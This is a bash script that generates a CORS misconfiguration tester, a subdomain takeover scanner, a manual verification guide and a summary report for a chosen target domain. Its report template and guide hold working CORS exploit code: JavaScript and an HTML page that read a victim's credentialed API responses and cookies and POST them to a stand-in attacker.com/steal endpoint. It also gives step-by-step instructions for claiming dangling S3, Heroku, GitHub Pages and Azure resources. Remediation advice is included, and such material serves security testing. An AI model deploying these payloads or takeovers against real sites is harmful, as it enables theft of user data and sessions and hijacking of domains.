#!/bin/bash
# 🌐 Elite CORS Misconfiguration & Subdomain Takeover
# Advanced techniques for CORS and subdomain takeover detection

echo "🌐 Elite CORS & Subdomain Takeover Analysis Started"

TARGET=$1
if [ -z "$TARGET" ]; then
    echo "Usage: ./cors_subdomain_takeover.sh target.com"
    exit 1
fi

mkdir -p cors_subdomain_results
cd cors_subdomain_results

echo "🎯 Starting CORS & Subdomain analysis for $TARGET"

# ===== PHASE 1: CORS MISCONFIGURATION TESTING =====
echo "🔒 Phase 1: CORS misconfiguration testing..."

# Create CORS tester script
cat > cors_tester.py << 'EOF'
#!/usr/bin/env python3
import requests
import sys
import json
from urllib.parse import urlparse

class CORSTester:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
    def test_cors_origin(self, origin):
        """Test CORS with specific origin"""
        headers = {'Origin': origin}
        
        try:
            response = self.session.get(self.target_url, headers=headers, timeout=10)
            
            cors_headers = {
                'access-control-allow-origin': response.headers.get('Access-Control-Allow-Origin'),
                'access-control-allow-credentials': response.headers.get('Access-Control-Allow-Credentials'),
                'access-control-allow-methods': response.headers.get('Access-Control-Allow-Methods'),
                'access-control-allow-headers': response.headers.get('Access-Control-Allow-Headers'),
                'access-control-expose-headers': response.headers.get('Access-Control-Expose-Headers'),
                'access-control-max-age': response.headers.get('Access-Control-Max-Age')
            }
            
            # Filter out None values
            cors_headers = {k: v for k, v in cors_headers.items() if v is not None}
            
            return {
                'origin': origin,
                'status_code': response.status_code,
                'cors_headers': cors_headers,
                'vulnerable': self.analyze_vulnerability(origin, cors_headers)
            }
            
        except requests.exceptions.RequestException as e:
            return {
                'origin': origin,
                'error': str(e),
                'vulnerable': False
            }
    
    def analyze_vulnerability(self, origin, cors_headers):
        """Analyze if CORS configuration is vulnerable"""
        vulnerabilities = []
        
        acao = cors_headers.get('access-control-allow-origin', '')
        acac = cors_headers.get('access-control-allow-credentials', '').lower()
        
        # Check for wildcard with credentials
        if acao == '*' and acac == 'true':
            vulnerabilities.append('CRITICAL: Wildcard origin with credentials allowed')
        
        # Check for reflected origin
        if acao == origin and acac == 'true':
            vulnerabilities.append('HIGH: Reflected origin with credentials allowed')
        
        # Check for null origin
        if acao == 'null' and acac == 'true':
            vulnerabilities.append('HIGH: Null origin with credentials allowed')
        
        # Check for subdomain wildcard
        if acao and acao.startswith('*.') and acac == 'true':
            vulnerabilities.append('MEDIUM: Subdomain wildcard with credentials')
        
        # Check for insecure protocols
        if acao and acao.startswith('http://') and acac == 'true':
            vulnerabilities.append('MEDIUM: HTTP origin allowed with credentials')
        
        return vulnerabilities
    
    def comprehensive_cors_test(self):
        """Run comprehensive CORS tests"""
        print(f"🔒 Testing CORS for: {self.target_url}")
        
        # Test origins
        test_origins = [
            'https://evil.com',
            'http://evil.com',
            'https://attacker.com',
            'null',
            'https://subdomain.evil.com',
            f'https://evil.{urlparse(self.target_url).netloc}',
            f'https://{urlparse(self.target_url).netloc}.evil.com',
            'https://localhost',
            'https://127.0.0.1',
            'file://',
            'data:text/html,<script>alert(1)</script>',
            'https://www.google.com',
            'https://github.com'
        ]
        
        results = []
        
        for origin in test_origins:
            print(f"Testing origin: {origin}")
            result = self.test_cors_origin(origin)
            results.append(result)
            
            if result.get('vulnerable'):
                print(f"🚨 VULNERABLE: {origin}")
                for vuln in result['vulnerable']:
                    print(f"   - {vuln}")
        
        return results
    
    def generate_cors_report(self, results):
        """Generate CORS test report"""
        vulnerable_results = [r for r in results if r.get('vulnerable')]
        
        report = f"""# CORS Misconfiguration Report
Target: {self.target_url}
Total tests: {len(results)}
Vulnerable configurations: {len(vulnerable_results)}

## Vulnerable CORS Configurations
"""
        
        for result in vulnerable_results:
            report += f"""
### Origin: {result['origin']}
**Vulnerabilities:**
"""
            for vuln in result['vulnerable']:
                report += f"- {vuln}
"
            
            report += f"""
**CORS Headers:**
```json
{json.dumps(result['cors_headers'], indent=2)}
```

**Exploitation:**
```javascript
// CORS exploit for {result['origin']}
var xhr = new XMLHttpRequest();
xhr.open('GET', '{self.target_url}', true);
xhr.withCredentials = true;
xhr.onreadystatechange = function() {{
    if (xhr.readyState === 4) {{
        console.log(xhr.responseText);
        // Send data to attacker server
        fetch('https://attacker.com/steal', {{
            method: 'POST',
            body: xhr.responseText
        }});
    }}
}};
xhr.send();
```
"""
        
        with open('cors_report.md', 'w') as f:
            f.write(report)
        
        print(f"📋 CORS report saved: cors_report.md")
        return len(vulnerable_results)

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 cors_tester.py <target_url>")
        sys.exit(1)
    
    target_url = sys.argv[1]
    if not target_url.startswith(('http://', 'https://')):
        target_url = f"https://{target_url}"
    
    tester = CORSTester(target_url)
    results = tester.comprehensive_cors_test()
    vulnerable_count = tester.generate_cors_report(results)
    
    print(f"✅ CORS testing completed! Found {vulnerable_count} vulnerable configurations")

if __name__ == "__main__":
    main()
EOF

chmod +x cors_tester.py

# Run CORS testing
echo "🔒 Running CORS tests..."
python3 cors_tester.py "https://$TARGET"

# ===== PHASE 2: SUBDOMAIN ENUMERATION =====
echo "🔍 Phase 2: Subdomain enumeration for takeover..."

# Enhanced subdomain enumeration
echo "🌐 Enumerating subdomains..."

# Use multiple tools if available
if command -v subfinder &> /dev/null; then
    echo "Using subfinder..."
    subfinder -d "$TARGET" -silent -o subdomains_subfinder.txt
fi

if command -v amass &> /dev/null; then
    echo "Using amass..."
    amass enum -passive -d "$TARGET" -o subdomains_amass.txt
fi

# Certificate transparency
echo "🔍 Checking certificate transparency..."
curl -s "https://crt.sh/?q=%25.$TARGET&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u > subdomains_crt.txt

# Combine all subdomains
cat subdomains_*.txt 2>/dev/null | sort -u > all_subdomains.txt || echo "$TARGET" > all_subdomains.txt

echo "✅ Found $(wc -l < all_subdomains.txt) unique subdomains"

# ===== PHASE 3: SUBDOMAIN TAKEOVER DETECTION =====
echo "🎯 Phase 3: Subdomain takeover detection..."

# Create subdomain takeover detector
cat > subdomain_takeover.py << 'EOF'
#!/usr/bin/env python3
import requests
import dns.resolver
import sys
import time
import re

class SubdomainTakeoverDetector:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # Vulnerable service signatures
        self.signatures = {
            'GitHub Pages': {
                'cname': ['github.io', 'github.com'],
                'response': ['There isn't a GitHub Pages site here', 'For root URLs'],
                'nxdomain': False
            },
            'Heroku': {
                'cname': ['herokuapp.com', 'herokussl.com'],
                'response': ['No such app', 'There's nothing here'],
                'nxdomain': False
            },
            'Shopify': {
                'cname': ['myshopify.com'],
                'response': ['Sorry, this shop is currently unavailable'],
                'nxdomain': False
            },
            'AWS S3': {
                'cname': ['s3.amazonaws.com', 's3-website'],
                'response': ['NoSuchBucket', 'The specified bucket does not exist'],
                'nxdomain': False
            },
            'Fastly': {
                'cname': ['fastly.com'],
                'response': ['Fastly error: unknown domain'],
                'nxdomain': False
            },
            'Ghost': {
                'cname': ['ghost.io'],
                'response': ['The thing you were looking for is no longer here'],
                'nxdomain': False
            },
            'Pantheon': {
                'cname': ['pantheonsite.io'],
                'response': ['The gods are wise', '404 error unknown site'],
                'nxdomain': False
            },
            'Tumblr': {
                'cname': ['tumblr.com'],
                'response': ['Whatever you were looking for doesn't currently exist'],
                'nxdomain': False
            },
            'WordPress': {
                'cname': ['wordpress.com'],
                'response': ['Do you want to register'],
                'nxdomain': False
            },
            'Bitbucket': {
                'cname': ['bitbucket.io'],
                'response': ['Repository not found'],
                'nxdomain': False
            },
            'Azure': {
                'cname': ['azurewebsites.net', 'cloudapp.net'],
                'response': ['404 Web Site not found'],
                'nxdomain': False
            },
            'Netlify': {
                'cname': ['netlify.com'],
                'response': ['Not Found - Request ID'],
                'nxdomain': False
            }
        }
    
    def check_dns(self, subdomain):
        """Check DNS records for subdomain"""
        try:
            # Check A records
            a_records = dns.resolver.resolve(subdomain, 'A')
            a_ips = [str(record) for record in a_records]
            
            # Check CNAME records
            try:
                cname_records = dns.resolver.resolve(subdomain, 'CNAME')
                cnames = [str(record) for record in cname_records]
            except:
                cnames = []
            
            return {
                'exists': True,
                'a_records': a_ips,
                'cname_records': cnames
            }
            
        except dns.resolver.NXDOMAIN:
            return {'exists': False, 'nxdomain': True}
        except Exception as e:
            return {'exists': False, 'error': str(e)}
    
    def check_http_response(self, subdomain):
        """Check HTTP response for takeover signatures"""
        try:
            for protocol in ['https', 'http']:
                url = f"{protocol}://{subdomain}"
                response = self.session.get(url, timeout=10, allow_redirects=True)
                
                return {
                    'status_code': response.status_code,
                    'content': response.text[:1000],  # First 1000 chars
                    'headers': dict(response.headers),
                    'url': url
                }
        except requests.exceptions.RequestException as e:
            return {'error': str(e)}
    
    def analyze_takeover_potential(self, subdomain, dns_info, http_info):
        """Analyze if subdomain is vulnerable to takeover"""
        vulnerabilities = []
        
        # Check if subdomain has NXDOMAIN but still resolves via CNAME
        if dns_info.get('nxdomain') and dns_info.get('cname_records'):
            vulnerabilities.append('CRITICAL: NXDOMAIN with CNAME - Potential takeover')
        
        # Check against known vulnerable services
        if dns_info.get('cname_records'):
            for cname in dns_info['cname_records']:
                for service, sig in self.signatures.items():
                    # Check if CNAME matches vulnerable service
                    if any(pattern in cname.lower() for pattern in sig['cname']):
                        # Check HTTP response for takeover signatures
                        if http_info and 'content' in http_info:
                            if any(pattern.lower() in http_info['content'].lower() 
                                  for pattern in sig['response']):
                                vulnerabilities.append(f'HIGH: {service} takeover possible - {cname}')
        
        # Check for dangling DNS records
        if dns_info.get('exists') and http_info and 'error' in http_info:
            vulnerabilities.append('MEDIUM: DNS exists but HTTP fails - Potential dangling record')
        
        return vulnerabilities
    
    def scan_subdomain(self, subdomain):
        """Scan single subdomain for takeover"""
        print(f"🔍 Scanning: {subdomain}")
        
        # Check DNS
        dns_info = self.check_dns(subdomain)
        
        # Check HTTP response
        http_info = self.check_http_response(subdomain)
        
        # Analyze for takeover potential
        vulnerabilities = self.analyze_takeover_potential(subdomain, dns_info, http_info)
        
        result = {
            'subdomain': subdomain,
            'dns_info': dns_info,
            'http_info': http_info,
            'vulnerabilities': vulnerabilities,
            'vulnerable': len(vulnerabilities) > 0
        }
        
        if vulnerabilities:
            print(f"🚨 POTENTIAL TAKEOVER: {subdomain}")
            for vuln in vulnerabilities:
                print(f"   - {vuln}")
        
        return result
    
    def generate_takeover_report(self, results):
        """Generate subdomain takeover report"""
        vulnerable_results = [r for r in results if r['vulnerable']]
        
        report = f"""# Subdomain Takeover Report
Total subdomains scanned: {len(results)}
Potentially vulnerable: {len(vulnerable_results)}

## Vulnerable Subdomains
"""
        
        for result in vulnerable_results:
            report += f"""
### {result['subdomain']}
**Vulnerabilities:**
"""
            for vuln in result['vulnerabilities']:
                report += f"- {vuln}
"
            
            if result['dns_info'].get('cname_records'):
                report += f"""
**CNAME Records:**
"""
                for cname in result['dns_info']['cname_records']:
                    report += f"- {cname}
"
            
            if result['http_info'] and 'status_code' in result['http_info']:
                report += f"""
**HTTP Response:**
- Status Code: {result['http_info']['status_code']}
- Content Preview: {result['http_info']['content'][:200]}...
"""
        
        with open('subdomain_takeover_report.md', 'w') as f:
            f.write(report)
        
        print(f"📋 Takeover report saved: subdomain_takeover_report.md")
        return len(vulnerable_results)

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 subdomain_takeover.py <subdomains_file>")
        sys.exit(1)
    
    subdomains_file = sys.argv[1]
    
    try:
        with open(subdomains_file, 'r') as f:
            subdomains = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"❌ File not found: {subdomains_file}")
        sys.exit(1)
    
    detector = SubdomainTakeoverDetector()
    results = []
    
    print(f"🎯 Scanning {len(subdomains)} subdomains for takeover potential...")
    
    for subdomain in subdomains:
        result = detector.scan_subdomain(subdomain)
        results.append(result)
        time.sleep(0.5)  # Rate limiting
    
    vulnerable_count = detector.generate_takeover_report(results)
    print(f"✅ Subdomain takeover scan completed! Found {vulnerable_count} potentially vulnerable subdomains")

if __name__ == "__main__":
    main()
EOF

chmod +x subdomain_takeover.py

# Run subdomain takeover detection
echo "🎯 Running subdomain takeover detection..."
python3 subdomain_takeover.py all_subdomains.txt

# ===== PHASE 4: MANUAL VERIFICATION GUIDE =====
echo "📋 Phase 4: Creating manual verification guide..."

cat > manual_verification_guide.md << 'EOF'
# Manual CORS & Subdomain Takeover Verification Guide

## CORS Manual Testing

### 1. Basic CORS Test
```bash
curl -H "Origin: https://evil.com" -v "https://target.com/api/data"
```

### 2. Credentials Test
```bash
curl -H "Origin: https://evil.com" -H "Cookie: session=abc123" -v "https://target.com/api/sensitive"
```

### 3. Preflight Request Test
```bash
curl -X OPTIONS -H "Origin: https://evil.com" -H "Access-Control-Request-Method: POST" -v "https://target.com/api/action"
```

### 4. CORS Exploit HTML
```html
<!DOCTYPE html>
<html>
<head><title>CORS Exploit</title></head>
<body>
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://target.com/api/sensitive', true);
xhr.withCredentials = true;
xhr.onreadystatechange = function() {
    if (xhr.readyState === 4) {
        // Send stolen data to attacker server
        fetch('https://attacker.com/steal', {
            method: 'POST',
            body: JSON.stringify({
                data: xhr.responseText,
                cookies: document.cookie
            })
        });
    }
};
xhr.send();
</script>
</body>
</html>
```

## Subdomain Takeover Manual Verification

### 1. GitHub Pages Takeover
```bash
# Check if subdomain points to GitHub
dig subdomain.target.com CNAME

# If CNAME points to username.github.io, create repo:
# 1. Create repository named 'username.github.io'
# 2. Add index.html with proof
# 3. Enable GitHub Pages
```

### 2. AWS S3 Takeover
```bash
# Check if subdomain points to S3
dig subdomain.target.com CNAME

# If CNAME points to S3 bucket, create bucket:
aws s3 mb s3://bucket-name --region us-east-1
aws s3 website s3://bucket-name --index-document index.html
```

### 3. Heroku Takeover
```bash
# Check if subdomain points to Heroku
dig subdomain.target.com CNAME

# If CNAME points to herokuapp.com:
heroku create app-name
# Deploy simple app with proof
```

### 4. Azure Takeover
```bash
# Check if subdomain points to Azure
dig subdomain.target.com CNAME

# If CNAME points to azurewebsites.net:
# Create Azure Web App with matching name
```

## Verification Steps

### For CORS:
1. Set up attacker domain
2. Host exploit HTML
3. Test with victim browser
4. Verify data exfiltration

### For Subdomain Takeover:
1. Verify DNS configuration
2. Claim the service account
3. Upload proof-of-concept
4. Test subdomain access
5. Document impact

## Impact Assessment

### CORS Vulnerabilities:
- **Critical**: Wildcard with credentials
- **High**: Reflected origin with credentials
- **Medium**: Subdomain wildcard issues

### Subdomain Takeover:
- **Critical**: Full subdomain control
- **High**: Phishing potential
- **Medium**: SEO/reputation impact
EOF

# ===== PHASE 5: COMPREHENSIVE REPORTING =====
echo "📊 Phase 5: Generating comprehensive report..."

cat > cors_subdomain_comprehensive_report.md << EOF
# CORS & Subdomain Takeover Analysis Report for $TARGET
Generated: $(date)

## Executive Summary
This report covers CORS misconfigurations and subdomain takeover vulnerabilities for $TARGET.

## CORS Analysis Results
- Target tested: https://$TARGET
- Test origins: 13 different malicious origins
- Vulnerable configurations found: $(grep -c "VULNERABLE" cors_report.md 2>/dev/null || echo "0")

## Subdomain Takeover Results
- Subdomains enumerated: $(wc -l < all_subdomains.txt)
- Potentially vulnerable: $(grep -c "POTENTIAL TAKEOVER" subdomain_takeover_report.md 2>/dev/null || echo "0")

## Risk Assessment

### CORS Risks:
1. **Data Exfiltration**: Sensitive API data can be stolen
2. **Session Hijacking**: User sessions can be compromised
3. **CSRF Bypass**: Cross-site request forgery protection bypassed

### Subdomain Takeover Risks:
1. **Phishing**: Legitimate-looking phishing pages
2. **Cookie Theft**: Session cookies for parent domain
3. **Reputation Damage**: Malicious content on trusted domain
4. **SEO Poisoning**: Search engine manipulation

## Remediation

### CORS Fixes:
1. Use specific origins instead of wildcards
2. Never use wildcard (*) with credentials
3. Validate Origin header server-side
4. Implement proper preflight handling

### Subdomain Takeover Prevention:
1. Regular DNS auditing
2. Remove unused DNS records
3. Monitor subdomain creation
4. Implement DNS CAA records

## Tools Used
- Custom CORS tester (Python)
- Subdomain enumeration (subfinder, amass, crt.sh)
- Custom takeover detector (Python)
- DNS resolution analysis

## Next Steps
1. Review detailed reports (cors_report.md, subdomain_takeover_report.md)
2. Verify findings manually using provided guides
3. Implement recommended fixes
4. Re-test after remediation
EOF

echo "✅ CORS & Subdomain Takeover analysis completed!"
echo "📁 Results saved in: cors_subdomain_results/"
echo "📋 Reports generated:"
echo "   - cors_report.md"
echo "   - subdomain_takeover_report.md"
echo "   - manual_verification_guide.md"
echo "   - cors_subdomain_comprehensive_report.md"
echo ""
echo "🎯 Usage examples:"
echo "python3 cors_tester.py https://$TARGET"
echo "python3 subdomain_takeover.py all_subdomains.txt"
